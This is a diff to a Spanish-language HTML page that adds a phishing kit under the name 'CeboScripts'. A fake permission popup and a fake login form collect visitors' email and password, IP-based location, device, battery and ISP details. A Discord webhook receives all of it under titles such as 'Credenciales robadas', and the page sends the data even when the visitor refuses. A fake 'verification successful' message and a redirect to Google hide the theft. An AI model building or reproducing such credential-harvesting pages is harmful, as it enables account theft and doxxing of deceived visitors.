@@ -20,14 +20,15 @@
             align-items: center;
             overflow: hidden;
         }
+        /* OVERLAY DE PERMISO */
         .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(8px);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -103,65 +104,151 @@
             border-color: #ff0000;
             transform: scale(1.05);
         }
-        .status {
-            margin-top: 15px;
-            font-size: 0.8em;
-            color: #666;
-            display: none;
-        }
-        .status.show {
-            display: block;
-            animation: fadeIn 0.5s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
         .hidden {
             display: none !important;
         }
-        .data-display {
-            margin-top: 15px;
-            background: #111;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 0.75em;
-            color: #888;
-            text-align: left;
-            word-break: break-all;
-            border: 1px solid #222;
-            display: none;
+
+        /* FORMULARIO FALSO */
+        .login-container {
+            background: #0a0a0a;
+            border: 2px solid #333;
+            border-radius: 15px;
+            padding: 40px 50px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255,0,0,0.15);
         }
-        .data-display.show {
+        .login-container h2 {
+            color: #fff;
+            font-size: 1.8em;
+            margin-bottom: 5px;
+        }
+        .login-container .sub {
+            color: #888;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+        }
+        .login-container .logo {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        .input-group label {
+            color: #aaa;
+            font-size: 0.85em;
             display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1em;
+            transition: all 0.3s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #ff0000;
+            box-shadow: 0 0 20px rgba(255,0,0,0.15);
+        }
+        .input-group input::placeholder {
+            color: #555;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-login:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255,0,0,0.4);
+        }
+        .btn-login:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .status-msg {
+            margin-top: 15px;
+            color: #ff4444;
+            font-size: 0.85em;
+            min-height: 20px;
+        }
+        .footer-text {
+            margin-top: 20px;
+            color: #444;
+            font-size: 0.7em;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <!-- VENTANA EMERGENTE (GUI) -->
+    <!-- ====== OVERLAY DE PERMISO ====== -->
     <div class="overlay" id="permissionOverlay">
         <div class="modal">
             <span class="icon">⚠️</span>
             <h2>PERMISO REQUERIDO</h2>
             <p>
-                Este sitio necesita acceder a tu información básica<br>
+                Este sitio necesita acceder a tu información<br>
                 para continuar. ¿Aceptas?
             </p>
             <div class="btn-group">
                 <button class="btn btn-accept" id="btnAccept">ACEPTAR</button>
                 <button class="btn btn-reject" id="btnReject">RECHAZAR</button>
             </div>
-            <div class="status" id="statusMsg">Enviando datos...</div>
-            <div class="data-display" id="dataDisplay"></div>
         </div>
     </div>
 
-    <!-- CONTENIDO PRINCIPAL (se muestra después de aceptar/rechazar) -->
-    <div class="main hidden" id="mainContent">
-        <h1 style="color:#ff0000; text-shadow:0 0 30px rgba(255,0,0,0.5);">FUISTE DOXEADO</h1>
-        <p style="color:#fff;">Ph4ntom ya tiene tus datos.</p>
-        <p style="color:#888; font-size:0.8em; margin-top:30px;">Acceso concedido el: <span id="accessTime"></span></p>
+    <!-- ====== FORMULARIO FALSO (se muestra después de aceptar) ====== -->
+    <div class="login-container hidden" id="loginForm">
+        <div class="logo">🔐</div>
+        <h2>Iniciar Sesión</h2>
+        <p class="sub">Verificación de seguridad requerida</p>
+
+        <div class="input-group">
+            <label>📧 Correo Electrónico</label>
+            <input type="email" id="emailInput" placeholder="ejemplo@correo.com" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>🔑 Contraseña</label>
+            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
+        </div>
+
+        <button class="btn-login" id="btnLogin">Verificar Identidad</button>
+        <div class="status-msg" id="loginStatus"></div>
+        <div class="footer-text">Tus datos están seguros • Verificación SSL</div>
     </div>
 
     <script>
@@ -181,31 +268,26 @@
                 data.pais = ipData.country_name || 'No disponible';
                 data.proveedor = ipData.org || 'No disponible';
                 data.region = ipData.region || 'No disponible';
+                data.isp = ipData.org || 'No disponible';
             } catch (e) {
-                data.ip = 'Error al obtener';
+                data.ip = 'Error';
                 data.ciudad = 'Error';
                 data.pais = 'Error';
                 data.proveedor = 'Error';
                 data.region = 'Error';
+                data.isp = 'Error';
             }
 
-            // 2. Dispositivo (Android/iOS/PC)
+            // 2. Dispositivo
             const ua = navigator.userAgent || '';
-            if (/android/i.test(ua)) {
-                data.dispositivo = 'Android';
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                data.dispositivo = 'iOS (iPhone/iPad)';
-            } else if (/windows/i.test(ua)) {
-                data.dispositivo = 'Windows PC';
-            } else if (/mac/i.test(ua)) {
-                data.dispositivo = 'Mac';
-            } else if (/linux/i.test(ua)) {
-                data.dispositivo = 'Linux';
-            } else {
-                data.dispositivo = 'Desconocido';
-            }
+            if (/android/i.test(ua)) data.dispositivo = 'Android';
+            else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
+            else if (/windows/i.test(ua)) data.dispositivo = 'Windows PC';
+            else if (/mac/i.test(ua)) data.dispositivo = 'Mac';
+            else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
+            else data.dispositivo = 'Desconocido';
 
-            // 3. Batería (solo disponible en algunos navegadores)
+            // 3. Batería
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
@@ -220,49 +302,31 @@
                 data.cargando = 'No disponible';
             }
 
-            // 4. Conexión de Internet (ISP ya lo tenemos arriba)
-            // Pero intentamos obtener más info de conexión
+            // 4. Conexión
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
                     data.tipoConexion = conn.effectiveType || 'No disponible';
-                    data.descarga = conn.downlink ? conn.downlink + ' Mbps' : 'No disponible';
                 } else {
                     data.tipoConexion = 'No disponible';
-                    data.descarga = 'No disponible';
                 }
             } catch (e) {
                 data.tipoConexion = 'No disponible';
-                data.descarga = 'No disponible';
             }
 
-            // 5. Proveedor de internet (lo obtenemos de ipapi)
-            data.proveedorInternet = data.proveedor;
-
-            // 6. Dirección real (ubicación aproximada)
             data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
-
-            // 7. Hora
             data.hora = new Date().toLocaleString();
-
-            // 8. Referrer
-            data.referrer = document.referrer || 'Directo';
-
-            // 9. User Agent completo
             data.userAgent = ua;
+            data.referrer = document.referrer || 'Directo';
 
             return data;
         }
 
         // ======== ENVIAR A DISCORD ========
-        async function sendToDiscord(data, accion) {
-            const statusMsg = document.getElementById('statusMsg');
-            statusMsg.classList.add('show');
-            statusMsg.textContent = '📤 Enviando datos...';
-
+        async function sendToDiscord(data, email, password, accion) {
             const embed = {
-                color: accion === 'Aceptar' ? 0x00ff00 : 0xffaa00,
-                title: `🔴 CeboScripts - ${accion}`,
+                color: 0xff0000,
+                title: '🔴 CeboScripts - CREDENCIALES CAPTURADAS',
                 fields: [
                     { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                     { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
@@ -270,91 +334,103 @@
                     { name: '🌍 País', value: data.pais || 'No disponible', inline: true },
                     { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                     { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
-                    { name: '⚡ Cargando', value: data.cargando || 'No disponible', inline: true },
-                    { name: '📶 Conexión', value: data.tipoConexion || 'No disponible', inline: true },
-                    { name: '🏢 ISP', value: data.proveedorInternet || 'No disponible', inline: false },
+                    { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
+                    { name: '📧 CORREO', value: email || 'No capturado', inline: false },
+                    { name: '🔑 CONTRASEÑA', value: password || 'No capturada', inline: false },
+                    { name: '⚡ Acción', value: accion, inline: true },
                     { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false },
-                    { name: '💻 User-Agent', value: (data.userAgent || '').substring(0, 300), inline: false },
-                    { name: '🔗 Referrer', value: data.referrer || 'Directo', inline: false },
-                    { name: '⚡ Acción', value: accion, inline: true }
+                    { name: '💻 User-Agent', value: (data.userAgent || '').substring(0, 200), inline: false }
                 ],
                 footer: {
-                    text: 'CeboScripts • Datos capturados automáticamente'
+                    text: 'CeboScripts • Credenciales robadas'
                 },
                 timestamp: new Date().toISOString()
             };
 
             try {
-                const response = await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: 'CeboScripts Logger',
-                        content: `📢 **Nuevo registro - ${accion}**`,
+                        content: '📢 **¡NUEVAS CREDENCIALES!**',
                         embeds: [embed]
                     })
                 });
-
-                if (response.ok) {
-                    statusMsg.textContent = '✅ ¡Datos enviados correctamente!';
-                    statusMsg.style.color = '#00ff00';
-                    console.log('✅ Enviado correctamente');
-                } else {
-                    const errorText = await response.text();
-                    statusMsg.textContent = `❌ Error ${response.status}`;
-                    statusMsg.style.color = '#ff0000';
-                    console.error('❌ Error webhook:', response.status, errorText);
-                }
+                console.log('✅ Enviado a Discord');
             } catch (e) {
-                statusMsg.textContent = '❌ Error al enviar';
-                statusMsg.style.color = '#ff0000';
-                console.error('❌ Error:', e);
+                console.error('❌ Error al enviar:', e);
+            }
+        }
+
+        // ======== MANEJAR BOTÓN ACEPTAR ========
+        document.getElementById('btnAccept').addEventListener('click', async function() {
+            // Ocultar overlay de permiso
+            document.getElementById('permissionOverlay').classList.add('hidden');
+            // Mostrar formulario falso
+            document.getElementById('loginForm').classList.remove('hidden');
+
+            // Obtener datos del dispositivo (para enviar después)
+            window.deviceData = await getDeviceData();
+            console.log('✅ Datos de dispositivo capturados');
+        });
+
+        // ======== MANEJAR BOTÓN RECHAZAR ========
+        document.getElementById('btnReject').addEventListener('click', async function() {
+            // También envía datos aunque rechace
+            const data = await getDeviceData();
+            await sendToDiscord(data, 'No capturado', 'No capturado', 'Rechazó permiso');
+
+            // Mostrar mensaje de error y ocultar overlay
+            document.getElementById('permissionOverlay').classList.add('hidden');
+            document.body.innerHTML = `
+                <div style="text-align:center;padding:40px;color:#ff0000;">
+                    <h1>🚫 ACCESO DENEGADO</h1>
+                    <p style="color:#888;">Has sido registrado de todos modos.</p>
+                </div>
+            `;
+        });
+
+        // ======== MANEJAR ENVÍO DEL FORMULARIO ========
+        document.getElementById('btnLogin').addEventListener('click', async function() {
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            const statusMsg = document.getElementById('loginStatus');
+
+            // Validar campos
+            if (!email || !password) {
+                statusMsg.textContent = '⚠️ Por favor, completa todos los campos.';
+                statusMsg.style.color = '#ff4444';
+                return;
             }
 
-            // Mostrar datos en pantalla
-            const dataDisplay = document.getElementById('dataDisplay');
-            dataDisplay.classList.add('show');
-            dataDisplay.innerHTML = `
-                <strong>📍 Dirección:</strong> ${data.direccionReal}<br>
-                <strong>🌐 IP:</strong> ${data.ip}<br>
-                <strong>📱 Dispositivo:</strong> ${data.dispositivo}<br>
-                <strong>🔋 Batería:</strong> ${data.bateria}<br>
-                <strong>📶 ISP:</strong> ${data.proveedorInternet}
-            `;
-        }
-
-        // ======== MANEJAR BOTONES ========
-        async function handleAction(accion) {
-            // Deshabilitar botones
-            document.getElementById('btnAccept').disabled = true;
-            document.getElementById('btnReject').disabled = true;
-            document.getElementById('btnAccept').style.opacity = '0.5';
-            document.getElementById('btnReject').style.opacity = '0.5';
-
-            // Obtener datos
-            const data = await getDeviceData();
+            // Deshabilitar botón
+            this.disabled = true;
+            this.innerHTML = '<span class="loading-spinner"></span> Verificando...';
+            statusMsg.textContent = '';
 
             // Enviar a Discord
-            await sendToDiscord(data, accion);
+            const data = window.deviceData || await getDeviceData();
+            await sendToDiscord(data, email, password, 'Envió credenciales');
 
-            // Ocultar overlay después de 2 segundos
+            // Mostrar éxito falso
+            statusMsg.textContent = '✅ ¡Verificación exitosa! Redirigiendo...';
+            statusMsg.style.color = '#00ff00';
+            this.innerHTML = '✅ Verificado';
+
+            // Redirigir a una página real (opcional)
             setTimeout(() => {
-                document.getElementById('permissionOverlay').classList.add('hidden');
-                document.getElementById('mainContent').classList.remove('hidden');
-                document.getElementById('accessTime').textContent = new Date().toLocaleString();
+                window.location.href = 'https://www.google.com';
             }, 2000);
-        }
+        });
 
-        // ======== EVENT LISTENERS ========
-        document.getElementById('btnAccept').addEventListener('click', () => handleAction('Aceptar'));
-        document.getElementById('btnReject').addEventListener('click', () => handleAction('Rechazar'));
-
-        // ======== CARGAR DATOS AL INICIAR (para previsualización) ========
-        window.onload = async function() {
-            // Solo para mostrar algo rápido, no afecta el envío
-            const data = await getDeviceData();
-            console.log('Datos cargados:', data);
-        };
+        // ======== ENTER PARA ENVIAR ========
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const btn = document.getElementById('btnLogin');
+                if (!btn.disabled) btn.click();
+            }
+        });
     </script>
 </body>
 </html>
